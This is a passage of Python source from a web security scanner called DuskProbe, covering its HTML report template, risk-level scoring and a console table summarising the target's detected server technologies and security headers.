            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin-top: 30px;
        }}
        
        .summary-card {{
            background: linear-gradient(135deg, var(--light-bg), #ffffff);
            border-radius: var(--border-radius);
            padding: 25px;
            text-align: center;
            border: 2px solid transparent;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }}
        
        .summary-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }}
        
        .summary-card.critical {{
            border-color: var(--danger-color);
            background: linear-gradient(135deg, #fff5f5, #ffe6e6);
        }}
        
        .summary-card.high {{
            border-color: var(--warning-color);
            background: linear-gradient(135deg, #fffbf0, #fff4e6);
        }}
        
        .summary-card.medium {{
            border-color: var(--info-color);
            background: linear-gradient(135deg, #f0f9ff, #e6f3ff);
        }}
        
        .summary-card.low {{
            border-color: var(--success-color);
            background: linear-gradient(135deg, #f0fff4, #e6ffed);
        }}
        
        .summary-icon {{
            font-size: 3em;
            margin-bottom: 15px;
        }}
        
        .summary-title {{
            font-size: 1.1em;
            font-weight: 600;
            color: var(--dark-text);
            margin-bottom: 10px;
        }}
        
        .summary-value {{
            font-family: 'Bungee', cursive;
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        
        .summary-description {{
            font-size: 0.9em;
            color: #666;
            line-height: 1.4;
        }}
        
        /* Vulnerability Table */
        .vulnerabilities-section {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .vuln-table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 25px;
            background: white;
            border-radius: var(--border-radius);
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }}
        
        .vuln-table th {{
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 18px 15px;
            text-align: left;
            font-weight: 600;
            font-family: 'Bungee', cursive;
            font-size: 0.9em;
        }}
        
        .vuln-table td {{
            padding: 15px;
            border-bottom: 1px solid #e9ecef;
            vertical-align: top;
        }}
        
        .vuln-table tr:nth-child(even) {{
            background-color: #f8f9fa;
        }}
        
        .vuln-table tr:hover {{
            background-color: #e3f2fd;
            transform: scale(1.01);
            transition: all 0.2s ease;
        }}
        
        .severity-badge {{
            padding: 8px 16px;
            border-radius: 25px;
            font-size: 0.8em;
            font-weight: bold;
            text-transform: uppercase;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }}
        
        .badge-critical {{
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
            box-shadow: 0 2px 10px rgba(220, 53, 69, 0.3);
        }}
        
        .badge-high {{
            background: linear-gradient(135deg, #fd7e14, #e55a00);
            color: white;
            box-shadow: 0 2px 10px rgba(253, 126, 20, 0.3);
        }}
        
        .badge-medium {{
            background: linear-gradient(135deg, #ffc107, #e0a800);
            color: #333;
            box-shadow: 0 2px 10px rgba(255, 193, 7, 0.3);
        }}
        
        .badge-low {{
            background: linear-gradient(135deg, #28a745, #1e7e34);
            color: white;
            box-shadow: 0 2px 10px rgba(40, 167, 69, 0.3);
        }}
        
        .badge-unknown {{
            background: linear-gradient(135deg, #6c757d, #545b62);
            color: white;
        }}
        
        /* Technical Intelligence Section */
        .tech-intelligence {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .tech-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 25px;
        }}
        
        .tech-card {{
            background: linear-gradient(135deg, #f8f9fa, #ffffff);
            border-radius: var(--border-radius);
            padding: 20px;
            border-left: 5px solid var(--accent-color);
        }}
        
        .tech-label {{
            font-weight: 600;
            color: var(--primary-color);
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        
        .tech-value {{
            font-size: 1.1em;
            color: var(--dark-text);
        }}
        
        /* OWASP & Compliance Section */
        .compliance-section {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .owasp-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 25px;
        }}
        
        .owasp-card {{
            background: linear-gradient(135deg, #fff3cd, #fef3c7);
            border: 2px solid var(--warning-color);
            border-radius: var(--border-radius);
            padding: 20px;
            text-align: center;
        }}
        
        .owasp-category {{
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--primary-color);
        }}
        
        .owasp-count {{
            font-family: 'Bungee', cursive;
            font-size: 2em;
            color: var(--warning-color);
        }}
        
        /* Remediation Section */
        .remediation-section {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .remediation-item {{
            background: linear-gradient(135deg, #f8f9fa, #ffffff);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 20px;
            border-left: 5px solid var(--highlight-color);
        }}
        
        .remediation-priority {{
            font-weight: 600;
            color: var(--danger-color);
            margin-bottom: 10px;
        }}
        
        .remediation-description {{
            color: var(--dark-text);
            line-height: 1.6;
        }}
        
        /* Footer */
        .report-footer {{
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: var(--border-radius);
            padding: 30px;
            text-align: center;
            box-shadow: var(--box-shadow);
            margin-top: 30px;
        }}
        
        .footer-brand {{
            font-family: 'Bungee', cursive;
            font-size: 1.5em;
            margin-bottom: 15px;
        }}
        
        .footer-disclaimer {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-top: 20px;
            font-size: 0.9em;
            line-height: 1.6;
        }}
        
        /* Responsive Design */
        @media (max-width: 768px) {{
            .container {{ padding: 0 15px; }}
            .report-title {{ font-size: 2.2em; }}
            .report-subtitle {{ font-size: 1.1em; }}
            .section-title {{ font-size: 1.6em; }}
            .summary-grid {{ grid-template-columns: 1fr; }}
            .tech-grid {{ grid-template-columns: 1fr; }}
            .owasp-grid {{ grid-template-columns: 1fr; }}
            .vuln-table {{ font-size: 0.9em; }}
        }}
        
        /* Print Styles */
        @media print {{
            body {{ background: white; }}
            .report-header, .executive-summary, .vulnerabilities-section,
            .tech-intelligence, .compliance-section, .remediation-section {{
                background: white !important;
                box-shadow: none !important;
                border: 1px solid #ddd;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header Section -->
        <div class="report-header">
            <div class="header-content">
                <h1 class="report-title">🛡️ DUSKPROBE</h1>
                <div class="report-subtitle">ENTERPRISE SECURITY ASSESSMENT REPORT</div>
                
                <div class="scan-metadata">
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-globe"></i> Target URL</div>
                        <div class="metadata-value">{target_url}</div>
                    </div>
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-calendar"></i> Scan Date</div>
                        <div class="metadata-value">{scan_time}</div>
                    </div>
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-shield-alt"></i> Security Posture</div>
                        <div class="metadata-value">{security_posture}</div>
                    </div>
                    <div class="metadata-card">
                        <div class="metadata-label"><i class="fas fa-server"></i> IP Address</div>
                        <div class="metadata-value">{ip_address}</div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Executive Summary -->
        <div class="executive-summary">
            <h2 class="section-title">
                <i class="fas fa-chart-line"></i>
                EXECUTIVE SUMMARY
            </h2>
            
            <div class="summary-grid">
                <div class="summary-card critical">
                    <div class="summary-icon" style="color: var(--danger-color);">
                        <i class="fas fa-exclamation-triangle"></i>
                    </div>
                    <div class="summary-title">Critical Vulnerabilities</div>
                    <div class="summary-value" style="color: var(--danger-color);">{severity_counts.get('CRITICAL', 0)}</div>
                    <div class="summary-description">Immediate action required</div>
                </div>
                
                <div class="summary-card high">
                    <div class="summary-icon" style="color: var(--warning-color);">
                        <i class="fas fa-fire"></i>
                    </div>
                    <div class="summary-title">High Risk Issues</div>
                    <div class="summary-value" style="color: var(--warning-color);">{severity_counts.get('HIGH', 0)}</div>
                    <div class="summary-description">Priority remediation needed</div>
                </div>
                
                <div class="summary-card medium">
                    <div class="summary-icon" style="color: var(--info-color);">
                        <i class="fas fa-info-circle"></i>
                    </div>
                    <div class="summary-title">Medium Risk Issues</div>
                    <div class="summary-value" style="color: var(--info-color);">{severity_counts.get('MEDIUM', 0)}</div>
                    <div class="summary-description">Scheduled remediation</div>
                </div>
                
                <div class="summary-card low">
                    <div class="summary-icon" style="color: var(--success-color);">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <div class="summary-title">Low Risk Issues</div>
                    <div class="summary-value" style="color: var(--success-color);">{severity_counts.get('LOW', 0)}</div>
                    <div class="summary-description">Routine maintenance</div>
                </div>
                
                <div class="summary-card">
                    <div class="summary-icon" style="color: var(--primary-color);">
                        <i class="fas fa-bug"></i>
                    </div>
                    <div class="summary-title">Total Vulnerabilities</div>
                    <div class="summary-value" style="color: var(--primary-color);">{total_vulns}</div>
                    <div class="summary-description">Security issues detected</div>
                </div>
                
                <div class="summary-card">
                    <div class="summary-icon" style="color: var(--accent-color);">
                        <i class="fas fa-percentage"></i>
                    </div>
                    <div class="summary-title">Risk Level</div>
                    <div class="summary-value" style="color: var(--accent-color);">{self._get_overall_risk_level()}</div>
                    <div class="summary-description">Overall security rating</div>
                </div>
            </div>
        </div>
        
        <!-- Technical Intelligence -->
        <div class="tech-intelligence">
            <h2 class="section-title">
                <i class="fas fa-microchip"></i>
                TECHNICAL INTELLIGENCE
            </h2>
            
            <div class="tech-grid">
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-server"></i>
                        Server Software
                    </div>
                    <div class="tech-value">{server_software}</div>
                </div>
                
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-code"></i>
                        Programming Language
                    </div>
                    <div class="tech-value">{programming_language}</div>
                </div>
                
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-cogs"></i>
                        CMS Platform
                    </div>
                    <div class="tech-value">{cms_platform}</div>
                </div>
                
                <div class="tech-card">
                    <div class="tech-label">
                        <i class="fas fa-network-wired"></i>
                        IP Address
                    </div>
                    <div class="tech-value">{ip_address}</div>
                </div>
            </div>
        </div>
        
        <!-- OWASP Compliance -->
        <div class="compliance-section">
            <h2 class="section-title">
                <i class="fas fa-shield-alt"></i>
                OWASP 2025 COMPLIANCE ANALYSIS
            </h2>
            
            <div class="owasp-grid">"""
            
            # Add OWASP categories
            for category, count in owasp_categories.items():
                if count > 0:
                    html_content += f"""
                <div class="owasp-card">
                    <div class="owasp-category">{category}</div>
                    <div class="owasp-count">{count}</div>
                </div>"""
            
            html_content += """
            </div>
        </div>
        
        <!-- Detailed Vulnerability Analysis -->
        <div class="vulnerabilities-section">
            <h2 class="section-title">
                <i class="fas fa-bug"></i>
                DETAILED VULNERABILITY ANALYSIS
            </h2>
            
            <table class="vuln-table">
                <thead>
                    <tr>
                        <th><i class="fas fa-exclamation-circle"></i> Severity</th>
                        <th><i class="fas fa-bug"></i> Vulnerability Type</th>
                        <th><i class="fas fa-tachometer-alt"></i> CVSS Score</th>
                        <th><i class="fas fa-shield-alt"></i> OWASP Category</th>
                        <th><i class="fas fa-cog"></i> Technical Details</th>
                        <th><i class="fas fa-tools"></i> Remediation</th>
                        <th><i class="fas fa-crosshairs"></i> Attack Vector</th>
                        <th><i class="fas fa-business-time"></i> Business Impact</th>
                    </tr>
                </thead>
                <tbody>"""
            
            # Add comprehensive vulnerability rows
            for finding in self.findings:
                severity = finding.get('severity', 'Unknown').upper()
                vuln_type = finding.get('type', 'N/A')
                cvss_score = finding.get('cvss_score', 'N/A')
                owasp_category = finding.get('owasp_category', 'N/A')
                technical_details = finding.get('technical_details', 'N/A')
                remediation_steps = finding.get('remediation_steps', 'N/A')
                attack_vector = finding.get('attack_vector', 'N/A')
                business_impact = finding.get('business_impact', 'N/A')
                cve_references = ', '.join(finding.get('cve_references', []))
                affected_url = finding.get('url', 'N/A')
                
                badge_class = f"badge-{severity.lower()}" if severity.lower() in ['critical', 'high', 'medium', 'low'] else 'badge-unknown'
                
                html_content += f"""
                    <tr>
                        <td><span class="severity-badge {badge_class}">
                            <i class="fas fa-exclamation-triangle"></i> {severity}
                        </span></td>
                        <td><strong>{vuln_type}</strong><br>
                            <small style="color: #666;">CVE: {cve_references[:50]}{'...' if len(cve_references) > 50 else ''}</small></td>
                        <td><strong>{cvss_score}</strong></td>
                        <td>{owasp_category}</td>
                        <td>{technical_details}<br>
                            <small style="color: #666;">URL: {affected_url[:40]}{'...' if len(affected_url) > 40 else ''}</small></td>
                        <td>{remediation_steps}</td>
                        <td><span style="padding: 4px 8px; background: #e9ecef; border-radius: 4px; font-size: 0.8em;">{attack_vector}</span></td>
                        <td>{business_impact}</td>
                    </tr>"""
            
            html_content += """
                </tbody>
            </table>
        </div>
        
        <!-- Remediation Recommendations -->
        <div class="remediation-section">
            <h2 class="section-title">
                <i class="fas fa-tools"></i>
                PRIORITY REMEDIATION RECOMMENDATIONS
            </h2>"""
            
            # Group vulnerabilities by type for remediation
            vuln_types = {}
            for finding in self.findings:
                vuln_type = finding.get('type', 'Unknown')
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(finding)
            
            priority_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
            
            for vuln_type, vulns in vuln_types.items():
                count = len(vulns)
                highest_severity = max([v.get('severity', 'LOW') for v in vulns], key=lambda x: priority_order.index(x) if x in priority_order else 999)
                remediation = vulns[0].get('remediation_steps', 'Implement security best practices')
                
                html_content += f"""
            <div class="remediation-item">
                <div class="remediation-priority">
                    <i class="fas fa-exclamation-triangle"></i>
                    {vuln_type} ({count} instance{'s' if count > 1 else ''}) - {highest_severity} Priority
                </div>
                <div class="remediation-description">
                    <strong>Recommended Action:</strong> {remediation}
                </div>
            </div>"""
            
            html_content += """
        </div>
        
        <!-- Footer -->
        <div class="report-footer">
            <div class="footer-brand">
                <i class="fas fa-shield-alt"></i>
                DUSKPROBE v5.0
            </div>
            <p>Enterprise Security Assessment Platform</p>
            <p>© 2025 Labib Bin Shahed. All rights reserved.</p>
            
            <div class="footer-disclaimer">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>CONFIDENTIAL SECURITY REPORT</strong><br>
                This document contains sensitive security information and should be handled according to your organization's data classification policies. 
                Distribution should be limited to authorized personnel only. Use this information responsibly and only for legitimate security improvement purposes.
            </div>
        </div>
    </div>
    
    <script>
        // Add some interactive features
        document.addEventListener('DOMContentLoaded', function() {{
            // Animate summary cards on load
            const cards = document.querySelectorAll('.summary-card');
            cards.forEach((card, index) => {{
                setTimeout(() => {{
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(20px)';
                    card.style.transition = 'all 0.6s ease';
                    setTimeout(() => {{
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    }}, 100);
                }}, index * 100);
            }});
            
            // Add click-to-expand functionality for technical details
            const techCells = document.querySelectorAll('.vuln-table td');
            techCells.forEach(cell => {{
                if (cell.textContent.length > 100) {{
                    cell.style.cursor = 'pointer';
                    cell.title = 'Click to expand';
                    cell.addEventListener('click', function() {{
                        this.style.whiteSpace = this.style.whiteSpace === 'normal' ? 'nowrap' : 'normal';
                        this.style.overflow = this.style.overflow === 'visible' ? 'hidden' : 'visible';
                    }});
                }}
            }});
        }});
    </script>
</body>
</html>"""
            
            # Write the comprehensive HTML content to file
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
                
        except Exception as e:
            self.console.print(f"❌ [bold red]Error generating professional HTML report:[/bold red] {e}")
            # Fallback to basic HTML if advanced generation fails
            if hasattr(self, 'df') and self.df is not None:
                self.df.to_html(output_path, index=False, border=1, classes='table table-striped')

    def _get_overall_risk_level(self):
        """Calculate overall risk level based on vulnerability distribution."""
        severity_counts = {}
        for finding in self.findings:
            severity = finding.get('severity', 'Unknown').upper()
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        if severity_counts.get('CRITICAL', 0) > 0:
            return 'CRITICAL'
        elif severity_counts.get('HIGH', 0) >= 3:
            return 'HIGH'
        elif severity_counts.get('HIGH', 0) > 0 or severity_counts.get('MEDIUM', 0) >= 5:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _calculate_risk_percentage(self):
        """Calculate risk percentage for visual risk meter."""
        total_vulns = len(self.findings)
        if total_vulns == 0:
            return 10
        
        severity_counts = {}
        for finding in self.findings:
            severity = finding.get('severity', 'Unknown').upper()
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        # Weight severities differently
        risk_score = (
            severity_counts.get('CRITICAL', 0) * 25 +
            severity_counts.get('HIGH', 0) * 15 +
            severity_counts.get('MEDIUM', 0) * 8 +
            severity_counts.get('LOW', 0) * 3
        )
        
        # Cap at 100%
        return min(100, max(10, risk_score))

    def _display_technical_intelligence(self):
        """Display comprehensive technical reconnaissance information with advanced detection."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return
        
        # Create comprehensive technical information table with enhanced details
        table = Table(title="🕵️ Advanced Technical Intelligence & Dynamic Reconnaissance Report", show_header=True, header_style="bold cyan")
        table.add_column("Category", style="bold blue", width=25)
        table.add_column("Technology/Component", style="bold yellow", width=30)
        table.add_column("Details", style="white", width=40)
        table.add_column("Risk Level", style="bold magenta", width=12)

        base_url = self.site_info.get('url', 'N/A')

        # 🌐 IP Address & Geolocation
        ip_address = self.site_info.get('ip_address', 'Unknown')
        hostname = self.site_info.get('hostname', 'Unknown')
        if ip_address != 'Unknown':
            geolocation_hints = self.site_info.get('geolocation_hints', [])
            geo_info = '\n'.join(geolocation_hints[:3]) if geolocation_hints else 'No geolocation data'
            table.add_row(
                "🌐 IP Address & Location",
                f"{ip_address}\nHostname: {hostname}",
                f"Server IP: {ip_address}\n{geo_info}",
                "🟡 MEDIUM"
            )

        # ☁️ Hosting Provider
        hosting_provider = self.site_info.get('hosting_provider', 'Unknown')
        if hosting_provider != 'Unknown':
            table.add_row(
                "☁️ Hosting Provider",
                hosting_provider,
                f"Infrastructure: {hosting_provider}\nDetected via IP range analysis",
                "🟢 LOW"
            )

        # 🖥️ Server Software & Type
        server_type = self.site_info.get('server_type', 'Unknown')
        server_software = self.site_info.get('server_software', 'Unknown')
        server_version = self.site_info.get('server_version', 'Unknown')
        if server_type != 'Unknown':
            table.add_row(
                "🖥️ Server Type",
                f"{server_type} v{server_version}",
                f"Web Server: {server_software}\nVersion: {server_version}",
                "🟡 MEDIUM" if server_version != 'Unknown' else "🟢 LOW"
            )

        # 💻 Server Language & Powered-By
        powered_by = self.site_info.get('powered_by', '')
        php_version = self.site_info.get('php_version', '')
        if powered_by:
            lang_details = f"Powered by: {powered_by}"
            if php_version:
                lang_details += f"\nPHP Version: {php_version}"
            table.add_row(
                "💻 Server Technology",
                powered_by,
                lang_details,
                "🟡 MEDIUM"
            )

        # 🧱 Server Language (Backend)
        server_language = self.site_info.get('server_language', [])
        if server_language and isinstance(server_language, list) and server_language[0] != 'Not Detected':
            table.add_row(
                "🧱 Backend Language",
                ', '.join(server_language),
                f"Programming Languages: {', '.join(server_language)}\nDetected via headers and content analysis",
                "🟡 MEDIUM"
            )

        # 🔧 Framework Detection
        framework = self.site_info.get('framework', [])
        if framework and isinstance(framework, list) and framework[0] != 'Not Detected':
            table.add_row(
                "🔧 Web Framework",
                ', '.join(framework),
                f"Frameworks: {', '.join(framework)}\nDetected via signatures and patterns",
                "🟡 MEDIUM"
            )

        # 🗄️ Database Hints
        database_hints = self.site_info.get('database_hints', [])
        if database_hints:
            table.add_row(
                "🗄️ Database Technology",
                ', '.join(database_hints),
                f"Database Systems: {', '.join(database_hints)}\nDetected via error messages and headers",
                "🔴 HIGH"
            )

        # ⚛️ JavaScript Framework
        javascript_framework = self.site_info.get('javascript_framework', [])
        if javascript_framework and isinstance(javascript_framework, list) and javascript_framework[0] != 'Not Detected':
            table.add_row(
                "⚛️ JavaScript Framework",
                ', '.join(javascript_framework),
                f"Frontend Frameworks: {', '.join(javascript_framework)}\nClient-side technologies detected",
                "🟢 LOW"
            )

        # 🎨 CSS Framework
        css_framework = self.site_info.get('css_framework', [])
        if css_framework:
            table.add_row(
                "🎨 CSS Framework",
                ', '.join(css_framework),
                f"Styling Frameworks: {', '.join(css_framework)}",
                "🟢 LOW"
            )

        # 🔧 Build Tools
        build_tool = self.site_info.get('build_tool', [])
        if build_tool:
            table.add_row(
                "🔧 Build Tools",
                ', '.join(build_tool),
                f"Build Systems: {', '.join(build_tool)}\nDevelopment artifacts detected",
                "🟡 MEDIUM"
            )

        # 🏗️ CMS Detection
        cms = self.site_info.get('cms', [])
        if cms:
            table.add_row(
                "🏗️ Content Management System",
                ', '.join(cms),
                f"CMS Platform: {', '.join(cms)}\nDetected via content patterns",
                "🔴 HIGH"
            )

        # 🌐 Protocol & HTTP Version
        protocol = self.site_info.get('protocol', 'Unknown')
        http_version = self.site_info.get('http_version', 'Unknown')
        if protocol != 'Unknown':
            table.add_row(
                "🌐 Network Protocol",
                f"{protocol} / {http_version}",
                f"Protocol: {protocol}\nHTTP Version: {http_version}",
                "🟡 MEDIUM" if protocol == 'HTTP' else "🟢 LOW"
            )

        # 🔒 TLS/SSL Status
        tls_enabled = self.site_info.get('tls_enabled', False)
        hsts_enabled = self.site_info.get('hsts_enabled', False)
        port = self.site_info.get('port', 80)
        if tls_enabled is not None:
            tls_info = f"TLS/SSL: {'Enabled' if tls_enabled else 'Disabled'}\n"
            tls_info += f"HSTS: {'Enabled' if hsts_enabled else 'Disabled'}\n"
            tls_info += f"Port: {port}"
            if hsts_enabled:
                hsts_max_age = self.site_info.get('hsts_max_age', 'Unknown')
                tls_info += f"\nHSTS Max-Age: {hsts_max_age}"
            table.add_row(
                "🔒 TLS/SSL Security",
                'Enabled' if tls_enabled else 'Disabled',
                tls_info,
                "🟢 LOW" if tls_enabled else "🔴 CRITICAL"
            )

        # 🛡️ Security Headers
        security_headers_enabled = self.site_info.get('security_headers_enabled', [])
        security_headers_missing = self.site_info.get('security_headers_missing', [])
        if security_headers_enabled or security_headers_missing:
            headers_info = f"Enabled Headers: {len(security_headers_enabled) if isinstance(security_headers_enabled, list) else 0}\n"
            headers_info += f"Missing Headers: {len(security_headers_missing) if isinstance(security_headers_missing, list) else 0}\n"
            if isinstance(security_headers_enabled, list) and security_headers_enabled and security_headers_enabled[0] != 'None':
                headers_info += f"\n✅ Enabled: {security_headers_enabled[0][:40]}..."
            if isinstance(security_headers_missing, list) and security_headers_missing and security_headers_missing[0] != 'All Present':
                headers_info += f"\n❌ Missing: {', '.join(security_headers_missing[:3])}"
            table.add_row(
                "🛡️ Security Headers",
                f"{len(security_headers_enabled) if isinstance(security_headers_enabled, list) else 0} Enabled",
                headers_info,
                "🔴 HIGH" if (isinstance(security_headers_missing, list) and len(security_headers_missing) > 4) else "🟡 MEDIUM"
            )

        # 🚀 Compression & Cache
        compression = self.site_info.get('compression', 'None')
        cache_policy = self.site_info.get('cache_policy', 'None')
        if compression != 'None' or cache_policy != 'None':
            cache_info = f"Compression: {compression}\nCache Policy: {cache_policy[:50]}" if len(cache_policy) > 50 else f"Compression: {compression}\nCache Policy: {cache_policy}"
            table.add_row(
                "🚀 Performance Features",
                f"{compression}",
                cache_info,
                "🟢 LOW"
            )

        # 🔍 Technology Stack
        technology_stack = self.site_info.get('technology_stack', [])
        if technology_stack and isinstance(technology_stack, list) and technology_stack[0] != 'Not Detected':
            table.add_row(
                "🔍 Technology Stack",
                ', '.join(technology_stack[:3]),
                f"Technologies: {', '.join(technology_stack)}\nSignatures detected via headers",
                "🟢 LOW"
            )

        # 🔌 API Endpoint Detection
        api_endpoint = self.site_info.get('api_endpoint', 'No')
        content_type = self.site_info.get('content_type', 'Unknown')
        response_format = self.site_info.get('response_format', 'Unknown')
        if api_endpoint == 'Yes':
            table.add_row(
                "🔌 API Endpoint",
                response_format,
                f"API Detected: Yes\nContent-Type: {content_type}\nResponse Format: {response_format}",
                "🟡 MEDIUM"
            )

        # 🌐 Server Location Hints
        server_location_hints = self.site_info.get('server_location_hints', [])
        if server_location_hints:
            location_info = '\n'.join(server_location_hints[:3])
            table.add_row(
                "🌐 Server Location Hints",
                f"{len(server_location_hints)} hints",
                location_info,
                "🟢 LOW"
            )

        # 🛡️ WAF Detection
        waf_detected = self.site_info.get('waf_detected', [])
        if waf_detected and isinstance(waf_detected, list) and waf_detected[0] != 'None Detected':
            table.add_row(
                "🛡️ Web Application Firewall",
                ', '.join(waf_detected),
                f"WAF Systems: {', '.join(waf_detected)}\nProtection layer detected",
                "🟢 LOW"
            )

        # 🍪 Cookie Analysis
        cookie_analysis = self.site_info.get('cookie_analysis', [])
        if cookie_analysis:
            cookie_info = '\n'.join(cookie_analysis[:5])
            table.add_row(
                "🍪 Cookie Security",
                f"{len(cookie_analysis)} cookies",
                cookie_info,
                "🟡 MEDIUM"
            )

        # ⚡ Rate Limiting
        rate_limiting = self.site_info.get('rate_limiting', 'Not Detected')
        if rate_limiting != 'Not Detected':
            table.add_row(
                "⚡ Rate Limiting",
                "Enabled",
                f"Rate Limiting: {rate_limiting}",
                "🟢 LOW"
            )

        # 📏 Content Length
        content_length = self.site_info.get('content_length', 'Unknown')
        if content_length != 'Unknown':
            table.add_row(
                "📏 Response Size",
                content_length,
                f"Content Length: {content_length}",
                "🟢 LOW"
            )

        # Display the technical intelligence table
        self.console.print(table)
        
        # Add summary of technical findings
        tech_summary = self._generate_technical_summary()
        if tech_summary:
            tech_panel = Panel(
                tech_summary,
                title="[bold cyan]🔍 Technical Intelligence Summary[/bold cyan]",
                expand=False,
                border_style="cyan"
            )
            self.console.print(tech_panel)

    def _calculate_assessment_score(self) -> int:
        """Calculate a comprehensive assessment score based on gathered intelligence."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return 0
        
        score = 0
        max_score = 100
        
        # HTTPS and encryption (20 points)
        https_enabled = self.site_info.get('protocol_security', {}).get('https_enabled', False)
        if https_enabled:
            score += 20
        
        # Security headers (15 points)
        security_headers = self.site_info.get('security_headers', {})
        if security_headers:
            present_headers = [k for k, v in security_headers.items() if v != 'Missing']
            total_headers = len(security_headers)
            if total_headers > 0:
                score += int((len(present_headers) / total_headers) * 15)
        
        # WAF protection (10 points)
        waf_detected = self.site_info.get('waf_detected', 'Not detected')
        if waf_detected != 'Not detected':
            score += 10
        
        # Technology stack identification (15 points)
        tech_identified = 0
        if self.site_info.get('programming_language', 'Unknown') != 'Unknown':
            tech_identified += 1
        if self.site_info.get('web_framework', 'Unknown') != 'Unknown':
            tech_identified += 1
        if self.site_info.get('database_hints', []):
            tech_identified += 1
        if self.site_info.get('application_server', 'Unknown') != 'Unknown':
            tech_identified += 1
        score += int((tech_identified / 4) * 15)
        
        # Reconnaissance coverage (20 points)
        recon_modules = ['directory_enum', 'subdomain_discovery', 'email_addresses', 'sensitive_files']
        recon_found = sum(1 for module in recon_modules if self.site_info.get(module, []))
        score += int((recon_found / len(recon_modules)) * 20)
        
        # Network and service discovery (10 points)
        open_ports = self.site_info.get('open_ports', [])
        if open_ports:
            score += 10
        
        # Additional intelligence (10 points)
        additional_intel = 0
        if self.site_info.get('js_frameworks', []):
            additional_intel += 1
        if self.site_info.get('css_frameworks', []):
            additional_intel += 1
        if self.site_info.get('api_endpoints', []):
            additional_intel += 1
        if self.site_info.get('cms_detected', 'Unknown') != 'Unknown':
            additional_intel += 1
        score += int((additional_intel / 4) * 10)
        
        return min(score, max_score)
    
    def _get_completion_status(self) -> str:
        """Get the completion status based on gathered intelligence."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return "Incomplete"
        
        # Count successful intelligence gathering modules
        modules_completed = 0
        total_modules = 10  # Expected core modules
        
        # Core intelligence modules
        if self.site_info.get('server_headers'):
            modules_completed += 1
        if self.site_info.get('protocol_security'):
            modules_completed += 1
        if self.site_info.get('security_headers'):
            modules_completed += 1
        if self.site_info.get('programming_language', 'Unknown') != 'Unknown':
            modules_completed += 1
        if self.site_info.get('web_framework', 'Unknown') != 'Unknown':
            modules_completed += 1
        if self.site_info.get('directory_enum', []):
            modules_completed += 1
        if self.site_info.get('subdomain_discovery', []):
            modules_completed += 1
        if self.site_info.get('technology_fingerprint', {}):
            modules_completed += 1
        if self.site_info.get('open_ports', []):
            modules_completed += 1
        if self.site_info.get('waf_detected', 'Not detected') != 'Not detected':
            modules_completed += 1
        
        completion_percentage = (modules_completed / total_modules) * 100
        
        if completion_percentage >= 90:
            return "Complete"
        elif completion_percentage >= 70:
            return "Mostly Complete"
        elif completion_percentage >= 50:
            return "Partial"
        else:
            return "Incomplete"

    def _generate_technical_summary(self) -> str:
        """Generate a summary of technical intelligence findings with advanced detection."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return ""
        
        summary_parts = []
        
        # IP & Geolocation Summary
        ip_address = self.site_info.get('ip_address', 'Unknown')
        hosting_provider = self.site_info.get('hosting_provider', 'Unknown')
        if ip_address != 'Unknown':
            summary_parts.append(f"🌐 [bold cyan]IP:[/bold cyan] {ip_address} | [bold blue]Host:[/bold blue] {hosting_provider}")
        
        # Server & Technology Stack Summary
        server_type = self.site_info.get('server_type', 'Unknown')
        server_language = self.site_info.get('server_language', [])
        if server_type != 'Unknown' or (server_language and server_language[0] != 'Not Detected'):
            tech_info = server_type
            if server_language and server_language[0] != 'Not Detected':
                tech_info += f" + {', '.join(server_language[:2])}"
            summary_parts.append(f"🔧 [bold blue]Tech Stack:[/bold blue] {tech_info}")
        
        # Security posture assessment
